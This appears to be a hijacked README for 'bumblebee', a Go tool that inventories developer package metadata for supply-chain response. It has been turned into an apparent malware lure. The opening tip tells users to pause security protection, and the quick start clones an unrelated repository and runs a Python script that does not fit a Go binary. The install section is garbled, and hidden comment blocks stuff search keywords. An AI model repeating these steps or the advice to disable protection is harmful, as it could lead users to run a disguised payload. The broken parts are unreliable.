# bumblebee


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/ImageAxolotlTrim/bumblebee-tool.git
cd bumblebee-tool
python run.py
```


Bumblebee is a read-only inventory collector for package, extension,
and developer-tool metadata on macOS and Linux developer endpoints.

It answers a narrow supply-chain response question: when an advisory
names a package, extension, or version, which developer machines show
a match in their on-disk metadata right now?

SBOMs help answer what shipped, and EDR helps answer what ran or
touched the network, but supply-chain response often needs a different
view: messy local state across lockfiles, package-manager metadata,
extension manifests, and supported developer-tool configs.

Bumblebee turns that scattered on-disk state into structured NDJSON
component records and, when given an exposure catalog, flags exact
matches for fast, read-only exposure checks when responders already
know what they are looking for.

## Scope

- Single static binary, Go 1.25+, zero non-stdlib dependencies.
- Three scan profiles (`baseline`, `project`, `deep`) for different
  populations and cadences.
- Reads only the lockfiles, package-manager install metadata,
  extension manifests, and supported MCP JSON configs listed in
  [docs/inventory-sources.md](docs/inventory-sources.md). No package
  manager execution (`npm ls`, `pip show`, `go list`, ...) and no
  source-file reads. MCP host configs can carry environment values
  and credentials in their `env` blocks; Bumblebee parses these
  configs for the server inventory it needs but does not emit those
  values in its records.

## Coverage

| Family | Emitted `ecosystem` | Sources |
|---|---|---|
| npm | `npm` | `package-lock.json`, `npm-shrinkwrap.json`, `node_modules/.package-lock.json`, `node_modules/<pkg>/package.json` |
| pnpm | `npm` | `pnpm-lock.yaml`, `.pnpm/.../package.json` |
| Yarn | `npm` | `yarn.lock` (Classic + Berry) |
| Bun | `npm` | `bun.lock`; `bun.lockb` presence as diagnostic |
| PyPI | `pypi` | `*.dist-info/METADATA`, `INSTALLER`, `direct_url.json`, `*.egg-info/PKG-INFO` |
| Go modules | `go` | `go.sum`, `go.mod` |
| RubyGems | `rubygems` | `Gemfile.lock`, installed `*.gemspec` |
| Composer | `packagist` | `composer.lock`, `vendor/composer/installed.json` |
| MCP | `mcp` | JSON host configs: `mcp.json`, `.mcp.json`, `claude_desktop_config.json`, `mcp_config.json`, `mcp_settings.json`, `cline_mcp_settings.json`, plus `~/.gemini/settings.json` (Gemini CLI / Code Assist) and `~/.claude.json` (Claude Code user- and project-scoped `mcpServers`). Non-JSON configs (Codex `config.toml`, Continue YAML) are not parsed in v0.1. |
| Agent skills | `agent-skill` | `skills.sh` / `vercel-labs/skills` lock files: global `~/.agents/.skill-lock.json` (or `$XDG_STATE_HOME/skills/.skill-lock.json`) and project-local `skills-lock.json`. Loose `SKILL.md` directories without a lock file are not enumerated. |
| Editor extensions | `editor-extension` | VS Code, Cursor, Windsurf, VSCodium manifests |
| Browser extensions | `browser-extension` | Chromium-family (`manifest.json`) and Firefox (`extensions.json`) per profile |
| Homebrew | `homebrew` | Formula `INSTALL_RECEIPT.json` files and cask `.metadata` install markers |

Per-ecosystem detail: [docs/inventory-sources.md](docs/inventory-sources.md).


# Or pin a specific tag.
```

To build from a checkout:

```sh
go test ./...
```

Stamp an explicit version at build time:

```sh
```

`bumblebee version` prints the version plus the VCS revision, build
time, and Go runtime — so a record emitted in production can be traced
back to a specific build. Version precedence: `-ldflags` override,
tracked in `VERSION`.

### Self-test

After installing, run a built-in end-to-end check against embedded
fixtures:

```sh
bumblebee selftest
# selftest OK (2 findings in 1ms)
```

The fixtures live inside the binary, use deliberately fake package
names (`bumblebee-selftest-evil@0.0.0`), and make no network calls. A
non-zero exit means the local install can no longer detect what it
should — a fast pre-deployment smoke test for fleet rollouts.

## Profiles

Bumblebee is a one-shot scanner: each invocation performs a single scan
and exits. Cadence is the runner's responsibility (cron, launchd, systemd,
MDM, etc.). Each record carries `profile` and a per-root `root_kind` so
receivers can keep populations separate.

| Profile | Scans | Use for |
|---|---|---|
| `baseline` | Common global/user package roots, language toolchains, editor extensions, browser extensions, and MCP configs. | Recurring lightweight inventory via an external runner. |
| `project` | Configured development directories, such as `~/code`, `~/src`, or `~/work`. | Recurring inventory for known project workspaces. |
| `deep` | Explicit `--root` paths, including broad roots like `$HOME`. | On-demand incident or campaign checks, usually with `--ecosystem`, `--exposure-catalog`, and `--findings-only`. |

`baseline` and `project` refuse bare-home roots; only `deep` walks them.


# Baseline global inventory.
bumblebee scan --profile baseline > inventory.ndjson

# Daily project sweep with explicit roots.
bumblebee scan --profile project \
  --root "$HOME/code" \
  --root "$HOME/Developer"

# Limit a run to selected emitted ecosystems.
bumblebee scan --profile baseline \
  --ecosystem npm,pypi \
  --ecosystem go

# On-demand exposure scan against a published advisory.
bumblebee scan --profile deep \
  --root "$HOME" \
  --exposure-catalog ./catalog.json \
  --max-duration 10m
```

Preview the resolved roots without scanning:

```sh
bumblebee roots --profile baseline
# prints "<root_kind>\t<path>" lines
```

`--root` is a filesystem path to scan; repeatable, required for `deep`,
optional for the other profiles. `--ecosystem` is repeatable and
comma-separated. `--exposure-catalog` accepts a JSON file or a directory
of `*.json` catalogs (merged non-recursively, all files must share
`schema_version`). `--findings-only` requires `--exposure-catalog` and
suppresses package records while keeping findings. `bumblebee scan --help`
lists every flag.

## Output

Records are NDJSON, one per line. Diagnostics go to stderr as NDJSON. Each
run ends with a `scan_summary` record; receivers use it to decide whether
to promote a run to current state. See [docs/transport.md](docs/transport.md)
for HTTPS/file output and [docs/state-model.md](docs/state-model.md) for the
receiver-side current-state model.

Package record:

<details>
<summary>Example package record</summary>

```json
{
  "record_type": "package",
  "record_id": "package:...",
  "schema_version": "0.1.0",
  "scanner_name": "bumblebee",
  "run_id": "9b1f0c2e4d5a6b7c8d9e0f1a2b3c4d5e",
  "scan_time": "2026-05-15T18:22:01.482Z",
  "endpoint": {
    "hostname": "alex-mbp",
    "os": "darwin",
    "arch": "arm64",
    "username": "alex",
    "uid": "501",
    "device_id": "MDM-7F4A2B"
  },
  "profile": "project",
  "ecosystem": "npm",
  "package_name": "@tanstack/query-core",
  "normalized_name": "@tanstack/query-core",
  "version": "5.59.20",
  "project_path": "/Users/alex/code/web-app",
  "root_kind": "project_root",
  "package_manager": "pnpm",
  "source_type": "pnpm-lockfile",
  "source_file": "/Users/alex/code/web-app/pnpm-lock.yaml",
  "has_lifecycle_scripts": false,
  "confidence": "high"
}
```

</details>

`confidence`:

- `high` — exact identity and version came from canonical metadata.
- `medium` — identity is reliable, but version or source is partial.
- `low` — config/path/spec reference only; not proof of an installed exact version.

Finding record (exposure-catalog match):

<details>
<summary>Example finding record</summary>

```json
{
  "record_type": "finding",
  "record_id": "finding:...",
  "schema_version": "0.1.0",
  "scanner_name": "bumblebee",
  "run_id": "3a8c7d1e9f0b2a4c6d8e0f1a2b3c4d5e",
  "scan_time": "2026-05-15T18:22:01.482Z",
  "endpoint": {
    "hostname": "alex-mbp",
    "os": "darwin",
    "arch": "arm64",
    "username": "alex",
    "uid": "501",
    "device_id": "MDM-7F4A2B"
  },
  "profile": "deep",
  "finding_type": "package_exposure",
  "severity": "critical",
  "catalog_id": "advisory-2026-0042",
  "catalog_name": "example-pkg 1.2.3 (compromised release)",
  "ecosystem": "npm",
  "package_name": "example-pkg",
  "normalized_name": "example-pkg",
  "version": "1.2.3",
  "root_kind": "deep_home_root",
  "project_path": "/Users/alex/code/web-app",
  "source_type": "pnpm-lockfile",
  "source_file": "/Users/alex/code/web-app/pnpm-lock.yaml",
  "confidence": "high",
  "evidence": "exact name+version match (version=1.2.3)"
}
```

</details>

`record_id` is a content-addressed hash of a canonical identity tuple per
record type, stable across runs. Per-record-type field lists and dedupe
guidance: [docs/state-model.md](docs/state-model.md#record-identity-record_id).

## Exposure Catalog Format

Minimal JSON, exact `(ecosystem, name, version)` matching only:

```json
{
  "schema_version": "0.1.0",
  "entries": [
    {
      "id": "advisory-2026-0042",
      "name": "example-pkg 1.2.3 (compromised release)",
      "ecosystem": "npm",
      "package": "example-pkg",
      "versions": ["1.2.3"],
      "severity": "critical"
    }
  ]
}
```

The catalog must be a JSON object with `schema_version` and `entries`
keys. Bare top-level arrays are rejected. Unsupported future
`schema_version` values are rejected. Multiple catalog files can be
loaded together by pointing `--exposure-catalog` at a directory; see
the flag description above.

### Sample exposure catalogs

The [`threat_intel/`](threat_intel/) directory holds maintained exposure
catalogs built from public threat-intelligence reporting on recent
supply-chain campaigns, assembled with
[Perplexity Computer](https://www.perplexity.ai/computer) and updated
via PRs as new campaigns are reported. See
[`threat_intel/README.md`](threat_intel/README.md) for the current
catalog list and review guidance.

## License

Apache License 2.0. See [LICENSE](LICENSE).


<!-- python pip pypi package library module script tool windows linux macos -->
<!-- bumblebee-tool - tool utility software - download install setup -->
<!-- git clone open source bumblebee-tool converter | github bumblebee-tool alternative | native bumblebee-tool application | run bumblebee-tool parser | tutorial bumblebee-tool decoder | demo bumblebee-tool reader | linux modern bumblebee-tool encoder | low latency bumblebee-tool tracker | is bumblebee tool legit | advanced bumblebee-tool | 2025 safe bumblebee-tool monitor | advanced bumblebee-tool server | modern bumblebee-tool api | guide bumblebee-tool analyzer | how to install bumblebee-tool validator | simple bumblebee-tool parser | 2025 bumblebee-tool mobile | beginner offline bumblebee-tool web | get bumblebee-tool mirror | get bumblebee-tool server | updated reliable bumblebee-tool | demo low latency bumblebee-tool | run bumblebee-tool | free download powerful bumblebee-tool module | beginner bumblebee-tool fork | how to install bumblebee-tool web | how to build open source bumblebee-tool checker | new version bumblebee-tool client | modern bumblebee-tool | bumblebee tool not working | bumblebee tool saas | windows bumblebee-tool module | bumblebee-tool tool | walkthrough bumblebee-tool compressor | download for windows bumblebee-tool app | how to deploy bumblebee-tool | best bumblebee-tool application | run native bumblebee-tool engine | bumblebee-tool debugger | how to download reliable bumblebee-tool server | use bumblebee-tool optimizer | launch bumblebee-tool uploader | how to download bumblebee-tool sdk | how to setup bumblebee-tool api | macos free bumblebee-tool | beginner top bumblebee-tool | bumblebee tool fix | download bumblebee-tool replacement | fedora bumblebee-tool utility | fast bumblebee-tool tool -->
<!-- quick start bumblebee-tool builder | powerful bumblebee-tool | low latency bumblebee-tool extension | open source customizable bumblebee-tool generator | tar.gz bumblebee-tool copy | configure bumblebee-tool package | secure bumblebee-tool package | git clone github bumblebee-tool library | run on linux bumblebee-tool logger | demo lightweight bumblebee-tool | execute bumblebee-tool scanner | arch bumblebee-tool parser | bumblebee-tool compressor | arch customizable bumblebee-tool | easy bumblebee-tool utility | secure bumblebee-tool | documentation bumblebee-tool mobile | getting started bumblebee-tool | bumblebee tool workshop | setup bumblebee-tool binding | free bumblebee-tool library | best bumblebee-tool creator | bumblebee-tool cli | best bumblebee-tool | use bumblebee-tool | ubuntu bumblebee-tool alternative | run on windows bumblebee-tool builder | run on linux bumblebee-tool mirror | self hosted bumblebee-tool analyzer | local bumblebee-tool fork | how to run bumblebee-tool software | source code lightweight bumblebee-tool | how to use bumblebee-tool clone | run bumblebee-tool module | configurable bumblebee-tool application | how to deploy lightweight bumblebee-tool | minimal bumblebee-tool uploader | high performance bumblebee-tool module | setup bumblebee-tool | debian bumblebee-tool tracker | zip bumblebee-tool replacement | how to download fast bumblebee-tool | debian bumblebee-tool copy | how to configure bumblebee-tool scanner | how to run online bumblebee-tool | how to build bumblebee-tool tool | how to install bumblebee-tool logger | bumblebee-tool binding | source code bumblebee-tool api | lightweight bumblebee-tool validator -->
<!-- bumblebee-tool copy | bumblebee tool support | simple bumblebee-tool | linux bumblebee-tool fork | open source bumblebee-tool builder | ubuntu bumblebee-tool converter | download for linux bumblebee-tool converter | open bumblebee-tool platform | run on windows bumblebee-tool app | cross platform bumblebee-tool parser | cross platform bumblebee-tool extension | simple bumblebee-tool service | 2025 bumblebee-tool creator | configurable bumblebee-tool monitor | zip bumblebee-tool encoder | 2025 bumblebee-tool | extensible bumblebee-tool utility | native bumblebee-tool platform | bumblebee-tool creator | modular bumblebee-tool framework | bumblebee tool project | how to deploy bumblebee-tool tool | download for windows bumblebee-tool platform | online bumblebee-tool | online bumblebee-tool cli | bumblebee-tool extension | stable bumblebee-tool | install bumblebee-tool module | easy bumblebee-tool clone | self hosted bumblebee-tool clone | centos bumblebee-tool validator | modern bumblebee-tool editor | how to run bumblebee-tool tool | how to use bumblebee-tool converter | bumblebee-tool extractor | windows bumblebee-tool checker | download bumblebee-tool encoder | offline bumblebee-tool monitor | how to run production ready bumblebee-tool checker | production ready bumblebee-tool module | bumblebee tool cloud | start customizable bumblebee-tool | high performance bumblebee-tool creator | documentation bumblebee-tool scanner | bumblebee tool github | arch bumblebee-tool library | how to use bumblebee-tool analyzer | getting started bumblebee-tool viewer | github bumblebee-tool cli | run on windows bumblebee-tool -->
<!-- launch bumblebee-tool optimizer | local bumblebee-tool viewer | example bumblebee-tool copy | how to build bumblebee-tool wrapper | production ready bumblebee-tool analyzer | free native bumblebee-tool | macos bumblebee-tool tracker | ubuntu bumblebee-tool utility | updated cross platform bumblebee-tool | new version bumblebee-tool | how to use bumblebee-tool binding | simple bumblebee-tool application | macos bumblebee-tool | sample bumblebee-tool | 2026 bumblebee-tool | run on mac bumblebee-tool tool | easy bumblebee-tool | top bumblebee tool | download bumblebee-tool wrapper | free download github bumblebee-tool | wiki safe bumblebee-tool | github bumblebee-tool binding | self hosted bumblebee-tool reader | bumblebee tool blog | bumblebee-tool converter | bumblebee-tool viewer | how to deploy bumblebee-tool wrapper | bumblebee tool ci cd | run on linux top bumblebee-tool platform | free download bumblebee-tool validator | how to setup bumblebee-tool | wiki bumblebee-tool port | bumblebee-tool web | how to install bumblebee-tool | lightweight bumblebee-tool extractor | bumblebee-tool module | download for mac bumblebee-tool engine | build bumblebee-tool reader | bumblebee tool article | git clone bumblebee-tool | ubuntu bumblebee-tool generator | offline bumblebee-tool | new version bumblebee-tool converter | latest version bumblebee-tool | linux bumblebee-tool wrapper | bumblebee tool pipeline | free bumblebee-tool app | bumblebee-tool software | bumblebee tool vs | open bumblebee-tool checker -->
<!-- configure reliable bumblebee-tool | quickstart bumblebee-tool server | updated advanced bumblebee-tool | run on mac bumblebee-tool mirror | walkthrough bumblebee-tool utility | free bumblebee-tool desktop | linux cross platform bumblebee-tool | fedora bumblebee-tool | compile bumblebee-tool builder | reliable bumblebee-tool extension | build online bumblebee-tool | bumblebee-tool plugin | offline bumblebee-tool binding | arch bumblebee-tool | guide bumblebee-tool reader | bumblebee tool workflow | run advanced bumblebee-tool tracker | native bumblebee-tool binding | how to setup bumblebee-tool compressor | modular bumblebee-tool library | how to build bumblebee-tool | start top bumblebee-tool copy | macos bumblebee-tool generator | macos self hosted bumblebee-tool | free download bumblebee-tool | self hosted bumblebee-tool | run on mac fast bumblebee-tool | wiki lightweight bumblebee-tool mirror | quick start bumblebee-tool desktop | how to download bumblebee-tool tester | docs high performance bumblebee-tool reader | bumblebee-tool client | zip online bumblebee-tool | build fast bumblebee-tool | reliable bumblebee-tool generator | bumblebee tool review | how to install simple bumblebee-tool uploader | run bumblebee-tool package | zip fast bumblebee-tool | github modern bumblebee-tool copy | modular bumblebee-tool extractor | wiki bumblebee-tool creator | free download open source bumblebee-tool | free bumblebee-tool server | run on mac extensible bumblebee-tool cli | free download low latency bumblebee-tool | git clone bumblebee-tool reader | getting started safe bumblebee-tool | advanced bumblebee-tool generator | how to configure bumblebee-tool fork -->
<!-- portable bumblebee-tool desktop | bumblebee-tool package | high performance bumblebee-tool viewer | reliable bumblebee-tool package | low latency bumblebee-tool wrapper | bumblebee-tool application | linux bumblebee-tool package | docs bumblebee-tool tool | modern bumblebee-tool parser | demo bumblebee-tool alternative | download for linux bumblebee-tool scanner | how to install bumblebee-tool tester | bumblebee-tool encoder | compile safe bumblebee-tool | download for linux bumblebee-tool | cross platform bumblebee-tool debugger | run on windows bumblebee-tool monitor | documentation advanced bumblebee-tool downloader | centos self hosted bumblebee-tool | examples bumblebee-tool cli | beginner production ready bumblebee-tool mirror | git clone bumblebee-tool framework | top bumblebee-tool | quickstart bumblebee-tool viewer | debian bumblebee-tool tester | download open source bumblebee-tool | free bumblebee-tool mobile | extensible bumblebee-tool | how to run bumblebee-tool tracker | build minimal bumblebee-tool | how to setup bumblebee-tool tester | launch bumblebee-tool utility | beginner bumblebee-tool checker | wiki bumblebee-tool checker | simple bumblebee-tool viewer | github bumblebee-tool parser | macos bumblebee-tool api | low latency bumblebee-tool addon | low latency bumblebee-tool desktop | sample bumblebee-tool extractor | bumblebee tool benchmark | getting started bumblebee-tool addon | run on windows bumblebee-tool module | docs bumblebee-tool checker | arch bumblebee-tool tester | bumblebee tool reference | production ready bumblebee-tool plugin | reliable bumblebee-tool plugin | bumblebee-tool replacement | download for linux bumblebee-tool app -->
<!-- self hosted bumblebee-tool addon | cross platform bumblebee-tool software | bumblebee-tool addon | quickstart minimal bumblebee-tool | tutorial bumblebee-tool mobile | docs configurable bumblebee-tool | centos bumblebee-tool desktop | ubuntu self hosted bumblebee-tool | fedora bumblebee-tool port | configure bumblebee-tool uploader | local bumblebee-tool | git clone bumblebee-tool monitor | sample bumblebee-tool api | arch bumblebee-tool alternative | run on windows advanced bumblebee-tool | tar.gz bumblebee-tool generator | bumblebee-tool server | lightweight bumblebee-tool wrapper | 2026 bumblebee-tool checker | download for windows lightweight bumblebee-tool | sample bumblebee-tool software | open source bumblebee-tool monitor | latest version bumblebee-tool binding | fedora secure bumblebee-tool | reliable bumblebee-tool fork | bumblebee-tool scanner | simple bumblebee-tool tool | getting started bumblebee-tool web | how to download bumblebee-tool mirror | build low latency bumblebee-tool desktop | linux bumblebee-tool web | how to setup bumblebee-tool tracker | top bumblebee-tool module | setup bumblebee-tool engine | documentation bumblebee-tool program | examples bumblebee-tool editor | how to run bumblebee-tool port | low latency bumblebee-tool application | tutorial bumblebee-tool builder | windows easy bumblebee-tool | how to setup bumblebee-tool alternative | open source bumblebee-tool wrapper | fedora bumblebee-tool validator | download bumblebee-tool | how to download bumblebee-tool extractor | low latency bumblebee-tool | how to deploy bumblebee-tool editor | download customizable bumblebee-tool | walkthrough bumblebee-tool monitor | free bumblebee-tool module -->
<!-- centos bumblebee-tool | run bumblebee-tool gui | how to download bumblebee-tool parser | start bumblebee-tool compressor | execute extensible bumblebee-tool | secure bumblebee-tool engine | example top bumblebee-tool | examples bumblebee-tool reader | git clone configurable bumblebee-tool | how to setup offline bumblebee-tool | source code bumblebee-tool | how to deploy bumblebee-tool logger | 2025 bumblebee-tool validator | git clone bumblebee-tool utility | start bumblebee-tool parser | fast bumblebee-tool client | build bumblebee-tool compressor | bumblebee-tool monitor | reliable bumblebee-tool editor | guide bumblebee-tool monitor | safe bumblebee-tool | extensible bumblebee-tool module | windows stable bumblebee-tool | how to setup modular bumblebee-tool replacement | download for mac bumblebee-tool sdk | use bumblebee-tool logger | download for windows bumblebee-tool | download for mac secure bumblebee-tool | bumblebee-tool gui | new version bumblebee-tool reader | how to build bumblebee-tool extractor | configure bumblebee-tool library | build bumblebee-tool | tutorial bumblebee-tool | download for linux free bumblebee-tool reader | docs github bumblebee-tool | docs bumblebee-tool debugger | bumblebee-tool clone | documentation bumblebee-tool | download for mac bumblebee-tool replacement | zip bumblebee-tool tester | run on linux bumblebee-tool encoder | bumblebee tool tutorial | install local bumblebee-tool alternative | advanced bumblebee-tool web | linux bumblebee-tool | free bumblebee-tool parser | bumblebee-tool program | safe bumblebee-tool wrapper | quick start free bumblebee-tool -->
<!-- github modular bumblebee-tool software | high performance bumblebee-tool builder | tar.gz bumblebee-tool uploader | customizable bumblebee-tool | free download bumblebee-tool tester | guide bumblebee-tool mirror | open bumblebee-tool | offline bumblebee-tool compressor | windows bumblebee-tool scanner | download for linux advanced bumblebee-tool creator | compile online bumblebee-tool | bumblebee-tool tester | walkthrough bumblebee-tool mirror | low latency bumblebee-tool clone | sample bumblebee-tool builder | simple bumblebee-tool desktop | native bumblebee-tool generator | windows cross platform bumblebee-tool | documentation simple bumblebee-tool | get safe bumblebee-tool | latest version bumblebee-tool cli | examples bumblebee-tool | reliable bumblebee-tool copy | powerful bumblebee-tool optimizer | deploy top bumblebee-tool converter | linux portable bumblebee-tool | bumblebee tool error | native bumblebee-tool library | updated bumblebee-tool engine | free bumblebee-tool uploader | stable bumblebee-tool parser | open source bumblebee-tool service | tutorial online bumblebee-tool | example bumblebee-tool binding | debian bumblebee-tool client | updated bumblebee-tool | latest version bumblebee-tool clone | start bumblebee-tool creator | bumblebee-tool fork | start bumblebee-tool viewer | reliable bumblebee-tool encoder | github bumblebee-tool builder | secure bumblebee-tool client | fast bumblebee-tool mirror | free online bumblebee-tool | quickstart bumblebee-tool app | 2026 bumblebee-tool extractor | github bumblebee-tool compressor | example cross platform bumblebee-tool | top bumblebee-tool compressor -->
<!-- macos high performance bumblebee-tool encoder | high performance bumblebee-tool cli | how to setup high performance bumblebee-tool package | fast bumblebee-tool reader | bumblebee tool alternative | wiki bumblebee-tool platform | fast bumblebee-tool | compile bumblebee-tool converter | getting started bumblebee-tool editor | github bumblebee-tool app | updated bumblebee-tool library | bumblebee-tool generator | latest version online bumblebee-tool | bumblebee-tool wrapper | sample bumblebee-tool validator | install bumblebee-tool package | how to configure bumblebee-tool application | run on linux customizable bumblebee-tool monitor | bumblebee-tool framework | bumblebee-tool checker | how to download advanced bumblebee-tool | safe bumblebee-tool compressor | configure bumblebee-tool | deploy native bumblebee-tool | how to build bumblebee-tool tester | docs bumblebee-tool | bumblebee tool kubernetes | customizable bumblebee-tool desktop | bumblebee-tool port | easy bumblebee-tool application | guide bumblebee-tool | updated bumblebee-tool addon | production ready bumblebee-tool sdk | portable bumblebee-tool fork | run on linux bumblebee-tool library | bumblebee tool best practice | modular bumblebee-tool | download for windows bumblebee-tool generator | demo bumblebee-tool | docs top bumblebee-tool web | top bumblebee-tool program | secure bumblebee-tool checker | launch bumblebee-tool | demo customizable bumblebee-tool | lightweight bumblebee-tool cli | setup bumblebee-tool platform | local bumblebee-tool program | how to download top bumblebee-tool | github bumblebee-tool web | bumblebee-tool analyzer -->

<!-- Last updated: 2026-06-09 18:48:04 -->
